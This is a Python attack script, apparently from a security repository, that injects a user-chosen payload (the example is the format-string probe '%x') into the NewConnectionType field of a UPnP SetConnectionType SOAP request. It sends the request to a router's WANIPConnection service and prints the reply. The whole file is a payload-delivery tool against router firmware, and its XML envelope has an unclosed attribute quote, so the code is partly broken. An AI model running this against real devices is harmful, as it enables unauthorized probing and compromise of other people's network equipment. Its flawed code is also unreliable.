import requests

# This tool is meant to send payloads to target via SOAP protocol always test on your own systems!



# Grabbing info to use
print("\nFor information on what to type in check repo docs!")


# Example of usable ip for this script "192.168.0.1"
print("\nPlease type in the target ip address")
target_ip = input().strip()
print(f"Using {target_ip} As Target Ip")

# Example of usable port for this script "1900"
print("\nPlease type in the target port")
port = input().strip()
print(f"Using {port} As Target Port\n")


# Example of usable payload for this script "%x"
print("\nPlease type in the payload")
payload = input().strip()
print(f"Using {payload} For Payload\n")


# Example of usable uuid for this script "uuid:0018-f8d7-a07102009adc"
print("\nPlease type in the UUID")
uuid = input().strip()
print(f"Using {uuid} For UUID\n\n")


# Example of usable target service for this script "WANIPConnection:1"
print("\nPlease type in the target service")
service = input().strip()
print(f"Using {service} For Service\n\n")




# Example of usable url "http://192.168.0.1:5431/uuid:0018-f8d7-a07102009adc/WANIPConnection:1"
# Builds URL
url = "http://" + target_ip + ":" + port + "/" + uuid + "/" + service
print("-" * 30)
print(f"Built URL:")
print("-" * 30)
print(url)
print("-" * 30)
print("\n")




# SOAP Packet

headers = {
    "Content-Type": "text/xml; charset=\"utf-8\"",
    "SOAPAction": "\"urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType\""
}




packet = '''<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
            s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:SetConnectionType xmlns:u="urn:schemas-upnp-org:service:''' + service + '''>
    <NewConnectionType>''' + payload + '''</NewConnectionType>
    </u:SetConnectionType>
  </s:Body>
</s:Envelope>'''







# Finalize
print("-" * 30)
print(f"SOAP packet:")
print("-" * 30)
print(packet)
print("-" * 30)

print("Confirm Your Choices! (Y/N)")
conFirm = input().strip().upper()



if conFirm != "Y":
    print("Exiting")
    exit()



# Display response from target

response = requests.post(url, data=packet, headers=headers, stream=True)

print(f"\nStatus Code: {response.status_code}")
print(response.text)
